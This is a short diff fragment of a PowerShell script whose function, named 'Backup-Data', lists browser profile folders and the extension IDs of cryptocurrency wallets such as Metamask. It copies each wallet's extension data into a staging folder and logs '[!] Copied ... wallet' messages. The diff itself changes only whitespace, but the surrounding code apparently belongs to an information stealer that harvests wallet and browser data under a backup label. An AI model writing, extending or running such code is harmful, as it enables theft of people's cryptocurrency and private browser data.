@@ -799,7 +799,6 @@ function Backup-Data {
         "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
         "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
     }
-    
     $walletDirs = @{
         "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
     	"ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
@@ -833,10 +832,10 @@ function Backup-Data {
                                 Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
                                 $locationFile = Join-Path $walletDirPath "Location.txt"
                                 $extentionPath | Out-File -FilePath $locationFile -Force
-                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath"  -ForegroundColor Green
+                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
                             }
                             catch {
-                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath"  -ForegroundColor Red
+                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
                             }
                         }
                     }
